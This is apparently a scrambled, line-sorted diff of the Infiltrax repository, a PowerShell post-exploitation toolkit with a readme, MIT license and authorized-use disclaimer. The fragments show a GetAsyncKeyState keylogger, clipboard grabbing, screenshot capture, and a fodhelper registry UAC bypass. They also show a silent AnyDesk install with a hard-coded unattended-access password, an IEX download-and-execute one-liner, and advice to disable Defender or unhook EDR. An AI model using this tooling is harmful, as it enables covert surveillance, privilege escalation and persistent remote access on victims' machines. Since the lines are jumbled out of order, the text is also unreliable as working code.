@@ -1,0 +1,301 @@
+    
+           
+            
+                
+                    $previousState.Remove($keyCode)
+                $character = Get-Character -keyCode $keyCode
+                $id = Get-Content $stdoutPath
+                $modifiers[$keyCode] = $isPressed
+                $previousState[$keyCode] = $true
+                Remove-Item $stdoutPath -ErrorAction SilentlyContinue
+                Write-Host -NoNewline $character
+                if ($previousState.ContainsKey($keyCode)) {
+                return $path
+                return $shiftKeyMapping[$keyCode]
+                }
+            $isPressed = ($keyState -band 0x8000) -ne 0
+            $keyState = $API::GetAsyncKeyState($keyCode)
+            Download-And-Install-AnyDesk
+            Remove-Item $DestinationPath -Force
+            [int]$keyCode
+            if ($keyCode -eq 16 -or $keyCode -eq 160) {
+            if ($shiftKeyMapping.ContainsKey($keyCode)) {
+            if (Test-Path $path) {
+            if (Test-Path $stdoutPath) {
+            return $nonPrintableKeys[$keyCode]
+            return [char]$keyCode
+            }
+            } else {
+            } elseif ($isPressed -and (-not $previousState[$keyCode])) {
+            } elseif ($keyCode -eq 17 -or $keyCode -eq 18) {
+            } elseif (-not $isPressed) {
+        $File = Join-Path $Path $FileName
+        $Height = $Screen.Height
+        $Left = $Screen.Left
+        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $Top = $Screen.Top
+        $Width = $Screen.Width
+        $anyDeskPath = Find-AnyDeskPath
+        $anydesk = Get-Package -Name AnyDesk -ErrorAction SilentlyContinue
+        $currentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+        $possiblePaths = @(
+        $principal = New-Object System.Security.Principal.WindowsPrincipal($currentIdentity)
+        )
+        16 = $false 
+        160 = $false 
+        17 = $false 
+        18 = $false 
+        Add-Type -AssemblyName System.Drawing
+        Add-Type -AssemblyName System.Windows.Forms
+        Get-Clipboard -Raw
+        New-Item -ItemType Directory -Path $InstallPath -Force -ErrorAction SilentlyContinue
+        New-Item -ItemType Directory -Path (Split-Path -Parent $DestinationPath) -Force -ErrorAction SilentlyContinue
+        Setup-UnattendedAccess
+        Start-BitsTransfer -Source $AnyDeskURL -Destination $DestinationPath
+        Start-Sleep -Milliseconds 50
+        Start-Sleep -Seconds 5
+        [Parameter(Mandatory = $true)]
+        [Parameter(Mandatory = $true)][string]$OutputPath
+        [Parameter(Mandatory = $true)][string]$Path
+        catch {
+        for ($keyCode = 8
+        foreach ($path in $possiblePaths) {
+        if ($anyDeskPath) {
+        if ($anydesk) {
+        if ($bitmap) { $bitmap.Dispose() }
+        if ($graphic) { $graphic.Dispose() }
+        if ($keyCode -ge 32 -and $keyCode -le 126) {
+        if ($modifiers[16] -or $modifiers[160]) {
+        if ($nonPrintableKeys.ContainsKey($keyCode)) {
+        param (
+        return
+        return $null
+        return $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
+        try {
+        }
+        } 
+        } catch {
+        } else {
+       )
+    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+    $endTime = (Get-Date).AddSeconds($DurationInSeconds)
+    $keyCodes = @{
+    $modifiers = @{
+    $nonPrintableKeys = @{
+    $null = New-Item -Path $OutputPath -ItemType File -Force
+    $previousState = @{}
+    $shiftKeyMapping = @{
+    )
+    Bypasses UAC via fodhelper.exe to run powershell process in elevated session.
+    Check-AnyDeskInstallation
+    File Name: Infiltrax.ps1 
+    Original function Author: netbiosX. - pentestlab.blog 
+    Param(
+    Spawnning powershell or cmd from script gets caught by behavioural detection. Disable Real Time protection or unhook EDR first
+    Start-Sleep 3
+    This function is taken from https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692 all credit goes to netbiosX :). Spawnning cmd.exe or powersell.exe from script gets caught by behavioural 
+    This function is taken from https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692 who is the original author.
+    catch {
+    detection disable defender or unhook EDR first.
+    finally {
+    function Check-AnyDeskInstallation {
+    function Download-And-Install-AnyDesk {
+    function Find-AnyDeskPath {
+    function Get-Character {
+    function Setup-UnattendedAccess {
+    function Test-AdminAccess {
+    if (-not (Test-AdminAccess)) {
+    param (
+    param(
+    public static extern short GetAsyncKeyState(int vKey)
+    try {
+    while ((Get-Date) -lt $endTime) {
+    }
+ $keyCode
+ $keyCode -le 255
+ (Requires Administrative Privilege)
+ Append the keystroke to the same line in the console
+ Features
+ Infiltrax
+ Param (
+ To do: adding screen recording functionality probably
+ Usage
+ Warning and Legal Notice
+ alt
+ backspace
+ ctrl
+ delete
+ down arrow
+ end
+ enter
+ escape
+ for shift 
+ function Invoke-Clipboard {
+ home
+ left arrow
+ left shift
+ page down
+ page up
+ right arrow
+ right shift
+ space
+ tab
+ up arrow
+![Infiltrax](https://raw.githubusercontent.com/alexdhital/Infiltrax/main/usage.gif)
+"                Write-Output ""AnyDesk ID is: $id"""
+"                Write-Output ""Failed to retrieve AnyDesk ID. Output file not found."""
+"                [System.IO.File]::AppendAllText($OutputPath, $character, [System.Text.Encoding]::ASCII)"
+"            ""$InstallPath"
+"            ""C:"
+"            $stdoutPath = ""C:"
+"            Start-Process -FilePath $DestinationPath -ArgumentList ""--install "
+"            Start-Process -FilePath $anyDeskPath -ArgumentList ""--get-id"" -RedirectStandardOutput $stdoutPath -NoNewWindow -Wait"
+"            Start-Process -FilePath $anyDeskPath -ArgumentList ""--set-password $Password"" -Wait"
+"            Write-Output ""AnyDesk executable not found. Unattended access setup aborted."""
+"            Write-Output ""AnyDesk is already installed. Version: $($anydesk.Version)"""
+"            Write-Output ""AnyDesk is not installed. Installing now..."""
+"            Write-Output ""Error Occurred! Could not install AnyDesk to $InstallPath."""
+"            Write-Output ""Failed to remove file: $_"""
+"            Write-Output ""Getting AnyDesk ID..."""
+"            Write-Output ""Installing AnyDesk to $InstallPath"""
+"            Write-Output ""Setting password..."""
+"        $FileName = ""$env:COMPUTERNAME - $(get-date -f yyyy-MM-dd_HHmmss).png"""
+"        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height"
+"        $bitmap.Save($File, [System.Drawing.Imaging.ImageFormat]::Png)"
+"        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)"
+"        13 = """
+"        27 = ""ESC"" "
+"        32 = "" ""        "
+"        33 = ""PGUP"" "
+"        34 = ""PGDN"" "
+"        35 = ""END"" "
+"        36 = ""HOME"" "
+"        37 = ""LEFT"" "
+"        38 = ""UP"" "
+"        39 = ""RIGHT"" "
+"        40 = ""DOWN"" "
+"        46 = ""DEL""      "
+"        48 = "")"" "
+"        49 = ""!"" "
+"        50 = ""@"" "
+"        51 = """
+"        52 = ""$"" "
+"        53 = ""%"" "
+"        54 = """
+"        55 = """
+"        56 = """
+"        57 = ""("" "
+"        8 = """
+"        9 = """
+"        Write-Error ""Failed to save screenshot. Error: $_"""
+"        Write-Output ""Downloading AnyDesk from $AnyDeskURL to $DestinationPath"""
+"        Write-Output ""Error something went wrong"""
+"        Write-Output ""Screenshot saved to: $File"""
+"        Write-Output ""This function requires Administrative access."""
+"        [Parameter(Mandatory = $true)][int]$DurationInSeconds,"
+"        [String]$program = ""cmd /c start powershell.exe"" "
+"        [string]$AnyDeskURL = ""https://download.anydesk.com/AnyDesk.exe"","
+"        [string]$DestinationPath = ""C:"
+"        [string]$InstallPath,"
+"        [string]$Password,"
+"        return """" "
+"    $signatures = @"""
+"    New-Item ""HKCU:"
+"    New-ItemProperty -Path ""HKCU:"
+"    Remove-Item ""HKCU:"
+"    Set-ItemProperty -Path ""HKCU:"
+"    Start-Process ""C:"
+"    Write-Host """
+"    Write-Host -NoNewline ""Capturing keystrokes: """
+"    [DllImport(""user32.dll"")]"
+""" --start-with-win --silent"" -Wait"
+""" -Recurse -Force"
+"""$InstallPath"
+"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER"
+"AnyDesk"" -Password ""Unattended123!"" "
+"AnyDesk.exe"""
+"AnyDesk.exe"","
+"Desktop> Invoke-AnyDeskInstall -InstallPath ""C:"
+"Desktop> Invoke-FodHelperBypass -program ""calc.exe"""
+"Desktop> Invoke-Screenshot -Path ""C:"
+"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,"
+"Infiltrax is a post-exploitation reconnaissance tool for penetration testers and red teams, designed to capture screenshots, retrieve clipboard contents, log keystrokes, bypass UAC and install AnyDesk for persistent remote access."
+"Installs anydesk silently, sets up unattended access and gets remote id"
+"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,"
+"Permission is hereby granted, free of charge, to any person obtaining a copy"
+"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
+"b""        "
+"command"" -Force"
+"command"" -Name ""(default)"" -Value $program -Force"
+"command"" -Name ""DelegateExecute"" -Value """" -Force"
+"copies of the Software, and to permit persons to whom the Software is"
+"fodhelper.exe"" -WindowStyle Hidden"
+"furnished to do so, subject to the following conditions:"
+"id.txt"""
+"in the Software without restriction, including without limitation the rights"
+"n""     "
+"nKeystroke logging completed. Output saved to $OutputPath"""
+"of this software and associated documentation files (the ""Software""), to deal"
+"t""        "
+"to use, copy, modify, merge, publish, distribute, sublicense, and/or sell"
+.DESCRIPTION
+.NOTES
+.SYNOPSIS
+.SYPNOSIS
+: Access the current clipboard contents.
+: Bypasses UAC via fodhelper.exe
+: Install and configure AnyDesk with unattended access.
+: Record keystrokes for a specified duration.
+: Take screenshots of the entire screen and save them as PNG files.
+Administrator
+Alex
+AnyDesk
+AnyDesk Installation
+AppData
+Author: Alex Dhital
+Bypass UAC to run any program in elevated context. Default program powershell.exe
+Capture user keystrokes and save in a file
+Classes
+Clipboard Retrieval
+Copyright (c) 2024 Alex Dhital
+Desktop
+Desktop> IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/alexdhital/Infiltrax/main/Infiltrax.ps1')
+Desktop> Invoke-Clipboard
+Desktop> Invoke-KeyStrokeCapture -DurationInSeconds 30 -OutputPath C:
+Execute directly into memory
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+Get Clipboard contents
+Infiltrax File: Infiltrax.ps1
+Keystroke Logging
+License: MIT License
+Local
+MIT License
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+Open
+Program Files
+Program Files (x86)
+Required Dependencies: None
+SOFTWARE.
+Screenshot Capture
+Shell
+Simply gets the raw clipboard contents via Get-Clipboard powershell cmdlet hehe sry no sry
+Software
+System32
+Take desktop screenshot and save into certain location
+Tasks
+The above copyright notice and this permission notice shall be included in all
+This tool is intended solely for use by penetration testers and red team professionals during authorized engagements during post exploitation. Do not use this tool for unauthorized access or illegal activities.
+UAC Bypass
+Users
+Uses GetAsyncKeyState function from user32.dll to map key presses including special characters and appends them to specified file.
+Vlex
+Windows
+copies or substantial portions of the Software.
+function Invoke-AnyDeskInstall {
+function Invoke-FodHelperBypass {
+function Invoke-KeyStrokeCapture {
+function Invoke-Screenshot {
+keystrokes.txt
+ms-settings
+powershell
